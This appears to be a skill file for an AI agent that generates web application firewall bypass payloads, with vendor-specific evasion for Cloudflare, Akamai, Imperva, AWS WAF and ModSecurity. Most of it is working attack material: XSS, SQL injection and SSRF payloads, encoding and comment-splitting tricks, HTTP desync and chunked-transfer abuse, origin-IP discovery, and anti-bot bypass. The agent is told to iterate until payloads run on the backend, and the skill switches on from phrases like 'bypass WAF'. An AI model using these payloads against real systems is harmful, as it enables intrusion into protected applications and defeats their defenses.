---
name: kambo-waf-evade
description: Generate adaptive WAF bypass payloads based on the detected WAF vendor. When Cloudflare, Akamai, Imperva, AWS WAF, or ModSecurity blocks your payloads, this skill provides vendor-specific evasion techniques — encoding tricks, protocol-level bypasses, chunked transfer abuse, case mutation, and context-aware payload generation. Use when WAF blocks testing, when recon_waf identifies a WAF, when standard payloads get 403/406, or when the user says "bypass WAF", "WAF blocking", "evade", "cloudflare bypass", "get past the WAF".
triggers:
  - bypass WAF
  - WAF blocking
  - WAF evade
  - cloudflare bypass
  - akamai bypass
  - get past the WAF
  - 403 blocked
  - payload blocked
  - WAF evasion
  - evade detection
---

# Kambo WAF Evade — Adaptive WAF Bypass Engineering

The WAF saw your payload. Now make it see something else.

A WAF is a pattern matcher with a ruleset. Every pattern matcher has blind spots —
characters it doesn't normalize, encodings it doesn't decode, contexts it doesn't
understand, and protocols it doesn't inspect. Your job is to deliver the same
semantic payload in a syntactic form the WAF doesn't recognize.

**Principle**: the WAF parses your input one way, the application parses it another way.
Find a representation where the WAF says "safe" but the app interprets as malicious.

## When to Use

- After `recon_waf` identifies the WAF vendor
- When testing payloads return 403/406/429 (WAF signature match)
- When you know a vulnerability exists but can't prove it past the WAF
- When standard tools (sqlmap, XSS payloads) fail due to blocking
- As input to `vuln_xss`, `vuln_sqli`, `vuln_ssrf`, `vuln_ssti` for custom payloads

## Phase 1: WAF Identification & Rule Profiling

Before bypassing, understand what you're bypassing.

### 1.1 — Identify the WAF

```
Run: recon_waf(target)

Expected output identifies:
  - WAF vendor (Cloudflare, Akamai, Imperva, AWS WAF, ModSecurity, etc.)
  - Detection method (response headers, cookies, error pages, behavior)
  - Confidence level
```

### 1.2 — Profile the Rules

Send calibration payloads to understand what triggers blocking:

```
CALIBRATION SEQUENCE (safe, won't exploit anything):

  Level 1 — Keywords:
    Send: SELECT, UNION, script, alert, etc. in parameters
    Blocked? → keyword-based rules active

  Level 2 — Patterns:
    Send: ' OR 1=1--, <script>alert(1)</script>, {{7*7}}
    Blocked? → pattern matching active (expected)

  Level 3 — Encoding:
    Send: Same payloads with URL encoding, double encoding
    Blocked? → WAF decodes before matching

  Level 4 — Case:
    Send: SeLeCt, ScRiPt, uNiOn
    Blocked? → case-insensitive matching

  Level 5 — Whitespace:
    Send: SELECT/**/FROM, <script\x09>, payload\r\n
    Blocked? → whitespace normalization active

DOCUMENT: which levels trigger blocking and which pass through.
This map tells you exactly what evasion techniques will work.
```

### 1.3 — Response Analysis

```
WHEN BLOCKED, note:
  - HTTP status code (403? 406? 429? Custom?)
  - Response body (generic? WAF-branded? Blank?)
  - Response headers (any WAF-specific headers?)
  - Timing (immediate block? Or delayed = rate limit?)
  - Consistency (always blocked? Or sometimes passes?)

IF inconsistent: the WAF may have a race condition or cache bypass.
IF delayed: may be async analysis — fast requests might slip through.
```

## Phase 2: Universal Bypass Techniques

These techniques work against most WAFs regardless of vendor.

### 2.1 — Encoding Tricks

```
SINGLE ENCODING (if WAF doesn't decode):
  < → %3C
  > → %3E
  ' → %27
  " → %22
  / → %2F
  
DOUBLE ENCODING (if WAF decodes once, app decodes twice):
  < → %253C  (% → %25, then 3C)
  ' → %2527
  
UNICODE ENCODING:
  < → \u003c
  ' → \u0027
  / → \u002f

HTML ENTITY ENCODING (XSS context):
  < → &lt; → &#60; → &#x3C; → &#0000060;
  " → &quot; → &#34; → &#x22;

OVERLONG UTF-8 (if WAF validates UTF-8 poorly):
  / → %c0%af
  . → %c0%ae

NULL BYTE INJECTION:
  script%00 → some parsers stop at null, WAF reads full string
  
URL ENCODING with MIXED CASE:
  %2f vs %2F — some WAFs only match one case
```

### 2.2 — Structural Evasion

```
COMMENT INSERTION (SQL):
  SELECT → SEL/**/ECT
  UNION SELECT → UNION/*randomtext*/SELECT
  ' OR '1'='1 → '/**/OR/**/'1'='1

COMMENT INSERTION (HTML/JS):
  <script> → <scr<!---->ipt>
  javascript: → java<!---->script:
  
WHITESPACE ALTERNATIVES:
  Space → %09 (tab), %0a (newline), %0d (CR), %0c (form feed)
  Space → /**/ (SQL comment as space)
  Space → + (in query string)

CASE ALTERNATION:
  SELECT → SeLeCt → sElEcT
  <script> → <ScRiPt> → <SCRIPT>
  
CONCATENATION (SQL):
  'admin' → 'ad'+'min' (MSSQL)
  'admin' → 'ad'||'min' (Oracle/Postgres)
  'admin' → CONCAT('ad','min') (MySQL)
  
STRING FUNCTIONS:
  CHAR(97,100,109,105,110) → 'admin'
  0x61646d696e → 'admin' (hex)
  REVERSE('nimda') → 'admin'
```

### 2.3 — Protocol-Level Bypasses

```
HTTP PARAMETER POLLUTION (HPP):
  ?id=1&id=UNION+SELECT  → server may use second value, WAF checks first
  
CHUNKED TRANSFER ENCODING:
  Transfer-Encoding: chunked
  Send payload across multiple chunks — WAF may not reassemble

CONTENT-TYPE CONFUSION:
  Send body as: application/json → multipart/form-data → text/plain
  Some WAFs only inspect certain content types

HTTP METHOD OVERRIDE:
  X-HTTP-Method-Override: PUT (send as POST, server treats as PUT)
  X-Method-Override, X-HTTP-Method, _method parameter

HTTP/2 SPECIFIC:
  Header CONTINUATION frames (split headers across frames)
  Case-sensitive headers (HTTP/2 allows, WAF may not handle)
  
LINE FOLDING (HTTP/1.1):
  Header-Name: value\r\n\tontinuation
  (Deprecated but some servers still accept)

MULTIPART BOUNDARY TRICKS:
  Unusual boundary names, nested multiparts, wrong content-lengths
```

### 2.4 — Context-Specific Evasion

```
FOR XSS:
  Event handlers without <script>:
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    <body onpageshow=alert(1)>
    <input onfocus=alert(1) autofocus>
    <marquee onstart=alert(1)>
    <details open ontoggle=alert(1)>
  
  Without parentheses:
    alert`1`  (template literal)
    window['alert'](1)
    [].constructor.constructor('alert(1)')()
    
  Without alert/prompt/confirm:
    eval(atob('YWxlcnQoMSk='))
    Function('ale'+'rt(1)')()
    self['al'+'ert'](1)

FOR SQL INJECTION:
  Without SELECT:
    HANDLER table OPEN; HANDLER table READ NEXT; (MySQL)
    TABLE users; (PostgreSQL 15+)
    
  Without UNION:
    Subquery: (SELECT * FROM users LIMIT 1)
    Stacked queries: ;SELECT * FROM users--
    
  Without quotes:
    CHAR(97) instead of 'a'
    0x61646d696e instead of 'admin'
    
  Without spaces:
    UNION(SELECT(1),(2),(3))
    SELECT/**/username/**/FROM/**/users

FOR SSRF:
  Without obvious IPs:
    127.0.0.1 → 2130706433 (decimal)
    127.0.0.1 → 0x7f000001 (hex)
    127.0.0.1 → 0177.0.0.1 (octal)
    127.0.0.1 → 127.1 (shortened)
    localhost → [::1] (IPv6)
    DNS rebinding: attacker-domain → resolves to 127.0.0.1
```

## Phase 3: Vendor-Specific Bypasses

### 3.1 — Cloudflare

```
KNOWN TECHNIQUES:
  - Unicode normalization differences (WAF vs backend)
  - Chunked transfer with tiny chunks (1-2 bytes)
  - Origin IP exposure via:
    → Historical DNS records (check SecurityTrails, ViewDNS)
    → mail server headers (MX records often bypass CF)
    → Subdomains not behind CF (check all subdomains)
    → SSL cert direct IP scan (certificate search engines)
  - Bypass via CF Worker routes (if misconfigured)
  - HTTP/2 CONTINUATION frame abuse
  
CLOUDFLARE-SPECIFIC WEAKNESSES:
  - Doesn't inspect WebSocket frames after upgrade
  - gRPC traffic may have limited inspection
  - Large request bodies (>128KB) may bypass some rules
  - Managed rules have known bypasses (check latest research)
  
ANTI-BOT BYPASS (if Turnstile/Challenge active):
  - Legitimate browser fingerprint (use real browser via Playwright)
  - Cached cf_clearance cookie
  - Challenge-solving services (ethical considerations apply)
```

### 3.2 — Akamai (Kona/App & API Protector)

```
KNOWN TECHNIQUES:
  - Request header order manipulation
  - HTTP desync attacks (CL.TE patterns)
  - Large Cookie headers with payload embedded
  - X-Forwarded-* header injection
  - Path normalization differences (/./path, //path, /path%2f)
  
AKAMAI-SPECIFIC:
  - Bot detection relies on sensor data (akamai_bm)
  - Pragma headers manipulation
  - Origin mapping via Edge-* headers when misconfigured
```

### 3.3 — Imperva (Incapsula)

```
KNOWN TECHNIQUES:
  - X-Forwarded-For spoofing (older configs trust this)
  - Payload in HTTP fragment (#) — WAF may not inspect
  - Large POST bodies with payload at the end
  - Cookie-based session bypass (remove/modify incap_ses)
  - HTTP verb tampering (PROPFIND, OPTIONS may bypass rules)
  
IMPERVA-SPECIFIC:
  - JavaScript challenge can be solved programmatically
  - AJAX requests may have different rule sensitivity
  - JSON payloads may bypass rules designed for form data
```

### 3.4 — AWS WAF

```
KNOWN TECHNIQUES:
  - Regex rule limits (complex patterns with backtracking)
  - Request size limits (body > 8KB may not be fully inspected)
  - Unicode bypass (AWS rules may not normalize)
  - Rate-based rules: distribute across IPs
  
AWS-SPECIFIC:
  - Managed rule groups have documented coverage gaps
  - Custom rules may have logic errors (check via trial)
  - CloudFront + AWS WAF: cache-level bypass possible
  - API Gateway + WAF: different inspection than CloudFront
```

### 3.5 — ModSecurity (CRS)

```
KNOWN TECHNIQUES:
  - Paranoia level determines strictness (PL1 = many bypasses)
  - Anomaly scoring threshold: stay under threshold
  - Multiple small violations < threshold but one big = blocked
  - Version-specific bypasses (check CRS version via error pages)
  
MODSECURITY-SPECIFIC:
  - MULTIPART_STRICT_ERROR exploitation
  - SecRule exclusions may leave paths unprotected
  - REQUEST_FILENAME vs REQUEST_URI differences
  - ARGS vs ARGS_NAMES vs ARGS_GET vs ARGS_POST specificity
```

## Phase 4: Payload Generation Workflow

### 4.1 — Iterative Refinement

```
STEP 1: Start with known working payload
  Example: ' OR 1=1--

STEP 2: Send verbatim → likely blocked
  Note: which part triggered? (the OR? The --, the '?)

STEP 3: Apply single transformation
  ' OR 1=1--  →  ' oR 1=1--  (case change)
  Blocked? Try next transformation.

STEP 4: Stack transformations
  ' oR 1=1--  →  '/**/oR/**/1=1--  (+ comments)
  Blocked? Try different combination.

STEP 5: Change approach entirely
  ' OR 1=1--  →  ' HAVING 1=1--  (different keyword)
  ' OR 1=1--  →  '||(1)--  (operator instead of keyword)

STEP 6: Confirm execution
  Once payload passes WAF, verify it actually executes on the backend.
  A payload that passes the WAF but doesn't work = waste of time.

RULE: Never spend more than 30 minutes on a single WAF bypass.
      If stuck, move to a different endpoint or different vuln type.
```

### 4.2 — Output Format

```
KAMBO WAF EVASION REPORT
=========================
Target: {target}
WAF: {vendor} (confidence: {level})
Profile: {keywords/patterns/encoding/case/whitespace} blocked

CALIBRATION RESULTS:
  Level 1 (keywords): {blocked/pass}
  Level 2 (patterns): {blocked/pass}
  Level 3 (encoding): {blocked/pass}
  Level 4 (case):     {blocked/pass}
  Level 5 (space):    {blocked/pass}

BYPASSES FOUND:
  [B1] {technique} — passes WAF, confirmed execution
       Payload: {exact payload}
       Context: {SQL/XSS/SSRF/SSTI}
       
  [B2] {technique} — passes WAF, unconfirmed execution
       Payload: {exact payload}
       Status: needs validation on backend

ALTERNATIVE VECTORS (no WAF inspection):
  - WebSocket endpoint: {url}
  - Subdomain without WAF: {subdomain}
  - Direct IP: {ip} (if found)
  - API endpoint with different rules: {url}

FAILED ATTEMPTS:
  - {technique}: still blocked (for future reference)
```

## Integration with Other Skills

| Flow | Integration |
|------|-------------|
| `recon_waf` → identify WAF → `/kambo-waf-evade` | WAF identification triggers this skill |
| `/kambo-waf-evade` → bypass payloads → `vuln_xss`, `vuln_sqli` | Feed custom payloads into vuln tools |
| `/kambo-think-like-defense` → WAF-dependent profile → `/kambo-waf-evade` | Defense model identifies WAF reliance |
| `/kambo-hunt` → blocked → `/kambo-waf-evade` → unblocked → continue | Unblock the hunting pipeline |
| `/kambo-js-hunt` → endpoints behind WAF → `/kambo-waf-evade` | Test discovered endpoints past the WAF |

## Anti-Patterns

- **Brute forcing random encodings**: understand WHY a payload is blocked before trying random transforms. Calibrate first.
- **Ignoring the backend**: a WAF bypass that doesn't execute on the backend is worthless. Always confirm execution.
- **Attacking the WAF itself**: don't try to DoS or crash the WAF. That's out of scope for bounties and likely illegal.
- **Using known bypasses without checking version**: WAF bypasses get patched. What worked 6 months ago may not work today.
- **Spending too long on one target**: if 30 minutes of evasion produces nothing, the rules may be too tight. Pivot to an endpoint or protocol the WAF doesn't inspect.
- **Forgetting about alternative paths**: sometimes the best WAF bypass is finding a path that doesn't go through the WAF at all (direct IP, different subdomain, WebSocket, etc.).
